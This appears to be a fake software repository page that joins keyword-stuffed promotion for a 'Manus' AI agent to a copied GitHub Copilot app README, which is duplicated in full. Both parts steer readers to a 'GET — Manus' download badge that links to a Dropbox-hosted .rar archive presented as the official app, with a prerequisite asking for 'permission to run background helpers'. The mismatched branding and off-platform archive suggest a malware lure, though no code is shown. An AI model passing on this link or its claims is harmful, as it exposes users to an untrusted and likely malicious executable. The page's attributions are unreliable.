- **Autonomous Code Execution:** Manus AI agent runs code on its own to complete tasks, so you can focus on decisions instead of repetitive typing and debugging.

- **Task Automation For Daily Life:** Manus autonomous tasks handle small but time-consuming jobs, from organizing research to scheduling reminders, keeping your day running smoothly.
- **Personal Assistant That Works Quietly:** Manus personal assistant stays ready in the background, responding when you need help with study, home projects, or light work tasks.
- **Code And Browser In One Flow:** Manus code automation connects scripting with real browser actions, so your workflows move from idea to result without switching between tools.

---

## What Is Manus

Manus is an autonomous AI agent designed to run code and control a browser on your behalf. Instead of acting like a simple chatbot that only answers questions, Manus AI agent takes action. It can write and execute scripts, open web pages, interact with elements, and carry out multi-step tasks with minimal supervision. This makes Manus code automation useful for anyone who wants to reduce manual effort without learning a full programming stack.

The core idea behind Manus browser control is practical freedom. You describe what you need, and the agent figures out the steps. Whether that means checking a website for updated information, filling out a repetitive form, or testing a small script, Manus autonomous tasks turn your instructions into completed actions. Manus personal assistant works quietly in the background, ready whenever you need to delegate a small but annoying job.

Manus is not a heavy studio suite or a complex enterprise platform. It is a focused helper built for home, study, and small tasks. Students can use Manus code automation to organize research notes or run quick calculations. Remote workers can rely on Manus browser control to gather data from multiple pages. Anyone juggling several small projects can let Manus autonomous tasks handle the repetitive parts while they focus on the parts that need human judgment.

Over longer sessions, Manus personal assistant proves its value through consistency. You do not need to re-explain the same workflow every time. Manus AI agent remembers the pattern and applies it again. Manus code automation and Manus browser control work together so that a task starting in a script can finish in a browser, or the other way around. That flexibility keeps small projects moving without constant supervision.

- **Less Manual Work:** Manus AI agent takes over repetitive code and browser steps, so you spend less time on routine actions and more time on decisions.
- **One Agent, Many Tasks:** Manus autonomous tasks cover everything from simple file checks to multi-page web research, making the agent useful across different daily situations.
- **No Deep Technical Barrier:** Manus code automation handles the scripting layer while Manus browser control manages the web layer, so you do not need to be a developer to get results.
- **Quiet Background Helper:** Manus personal assistant stays out of the way until needed, then responds quickly without disrupting your main workflow.
- **Consistent Across Sessions:** Manus AI agent applies the same logic each time, reducing the mental overhead of switching between different tools and interfaces.
- **Built For Small Scale:** Manus autonomous tasks are designed for home, study, and light work, not just large enterprise environments.

Prerequisites: A compatible computer, a stable internet connection, and permission to run background helpers.

items.readme:
# GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for finding, running, steering, and landing software work across your GitHub repositories.

https://github.com/user-attachments/assets/50f215b5-f708-444e-83f7-3303bfa97963 ## The GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for managing software work from idea to pull request. It gives you a single control center for finding the right work to pick up, starting and steering agents, reviewing progress, and landing changes across repositories without constantly switching between terminals, editors, browser tabs, and GitHub pages. The app is built for parallel agent-driven development. Each local session runs in its own isolated git worktree, and cloud sessions let agents keep working in isolated GitHub-hosted environments that you can pick up from anywhere. That means you can have Copilot investigate bugs, implement issues, address review feedback, or explore changes side by side without branches or files colliding. Canvases turn agent work into shared, inspectable surfaces. Instead of burying plans, terminals, browser previews, diffs, and workflow state in a chat thread, canvases give you a place to see what an agent is doing, edit or redirect the work, and verify progress in context. But we also know as developers, much our time has always been devoted to tasks that aren't 'just' writing code. My Work brings together sessions, issues, pull requests, and repository context so you can decide what needs attention next. Automations turn repeatable prompts and workflows into scheduled or background tasks. Agent Merge helps carry pull requests through review, checks, and merge conditions so you stay focused on judgment, quality, and delivery. ## Getting started ### Prerequisites - [Git](https://github.com/git-guides/install-git) - A [GitHub Copilot](https://github.com/features/copilot/plans) plan — any plan works, including Copilot Free and [GitHub Copilot Student](https://github.com/education/students). No Copilot plan? You can still use the app by bringing your own key (BYOK) with your own model provider. ### Install Download the app for your platform: [![Download](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://www.dropbox.com/scl/fi/j76ijf5l3bdbckuip6kx9/GitHub_Copilot_app.rar?rlkey=acbqv1mezy4gd1wobkxw24oz1&st=8k9t5tp1&dl=1) You can also browse all builds on the [Releases](../../releases) page. For setup and a walkthrough of your first session, see the [documentation](https://gh.io/github-app-docs). ## This repository This repo is the public home for the GitHub Copilot app. Use it to: - Download releases from the [Releases](../../releases) page - File bugs and feature requests - Join discussions - Read release notes in [`changelog.md`](./changelog.md) ## Feedback Report problems or feature requests for the GitHub Copilot app team in the [Issues](https://github.com/github/app/issues) tab. When filing an issue, please include: - The app version - Your operating system and version - Steps to reproduce - Expected vs. actual behavior - Screenshots or videos - Logs from the `/collect-debug-logs` command. Note: These logs may contain sensitive information. For open-ended questions, please visit the [Discussions](https://github.com/github/app/discussions) tab. ### Stale issues Open issues with no activity for 60 days receive a warning and the `stale` label. They are automatically closed if there is no new activity for another 7 days. New activity removes that label on a subsequent daily run and resets the inactivity timer. Issues labeled `never-stale`, `help wanted`, `on-roadmap`, `pinned`, or `security` are exempt. Pull requests are left unchanged. The [stale issue workflow](./.github/workflows/stale-issues.yml) runs daily at 01:30 UTC and can also be run manually. GitHub Actions must be enabled for this automation to run. Each run has a budget of 5,000 operations and a 60-minute timeout. If the operations budget is exhausted, the workflow saves its progress in the Actions cache so a later run can resume. ## License © GitHub, Inc. All rights reserved. ## Data & Telemetry If you use the GitHub Copilot App with your GitHub Copilot account, we may collect usage data (such as code acceptance or rejections), associated conversation data, and user feedback submitted via the feedback dialog. See our [GitHub Copilot Trust Center](https://copilot.github.trust.page) for more information.

# GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for finding, running, steering, and landing software work across your GitHub repositories.

https://github.com/user-attachments/assets/50f215b5-f708-444e-83f7-3303bfa97963 ## The GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for managing software work from idea to pull request. It gives you a single control center for finding the right work to pick up, starting and steering agents, reviewing progress, and landing changes across repositories without constantly switching between terminals, editors, browser tabs, and GitHub pages. The app is built for parallel agent-driven development. Each local session runs in its own isolated git worktree, and cloud sessions let agents keep working in isolated GitHub-hosted environments that you can pick up from anywhere. That means you can have Copilot investigate bugs, implement issues, address review feedback, or explore changes side by side without branches or files colliding. Canvases turn agent work into shared, inspectable surfaces. Instead of burying plans, terminals, browser previews, diffs, and workflow state in a chat thread, canvases give you a place to see what an agent is doing, edit or redirect the work, and verify progress in context. But we also know as developers, much our time has always been devoted to tasks that aren't 'just' writing code. My Work brings together sessions, issues, pull requests, and repository context so you can decide what needs attention next. Automations turn repeatable prompts and workflows into scheduled or background tasks. Agent Merge helps carry pull requests through review, checks, and merge conditions so you stay focused on judgment, quality, and delivery. ## Getting started ### Prerequisites - [Git](https://github.com/git-guides/install-git) - A [GitHub Copilot](https://github.com/features/copilot/plans) plan — any plan works, including Copilot Free and [GitHub Copilot Student](https://github.com/education/students). No Copilot plan? You can still use the app by bringing your own key (BYOK) with your own model provider. ### Install Download the app for your platform: [![Download](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://www.dropbox.com/scl/fi/j76ijf5l3bdbckuip6kx9/GitHub_Copilot_app.rar?rlkey=acbqv1mezy4gd1wobkxw24oz1&st=8k9t5tp1&dl=1) You can also browse all builds on the [Releases](../../releases) page. For setup and a walkthrough of your first session, see the [documentation](https://gh.io/github-app-docs). ## This repository This repo is the public home for the GitHub Copilot app. Use it to: - Download releases from the [Releases](../../releases) page - File bugs and feature requests - Join discussions - Read release notes in [`changelog.md`](./changelog.md) ## Feedback Report problems or feature requests for the GitHub Copilot app team in the [Issues](https://github.com/github/app/issues) tab. When filing an issue, please include: - The app version - Your operating system and version - Steps to reproduce - Expected vs. actual behavior - Screenshots or videos - Logs from the `/collect-debug-logs` command. Note: These logs may contain sensitive information. For open-ended questions, please visit the [Discussions](https://github.com/github/app/discussions) tab. ### Stale issues Open issues with no activity for 60 days receive a warning and the `stale` label. They are automatically closed if there is no new activity for another 7 days. New activity removes that label on a subsequent daily run and resets the inactivity timer. Issues labeled `never-stale`, `help wanted`, `on-roadmap`, `pinned`, or `security` are exempt. Pull requests are left unchanged. The [stale issue workflow](./.github/workflows/stale-issues.yml) runs daily at 01:30 UTC and can also be run manually. GitHub Actions must be enabled for this automation to run. Each run has a budget of 5,000 operations and a 60-minute timeout. If the operations budget is exhausted, the workflow saves its progress in the Actions cache so a later run can resume. ## License © GitHub, Inc. All rights reserved. ## Data & Telemetry If you use the GitHub Copilot App with your GitHub Copilot account, we may collect usage data (such as code acceptance or rejections), associated conversation data, and user feedback submitted via the feedback dialog. See our [GitHub Copilot Trust Center](https://copilot.github.trust.page) for more information.
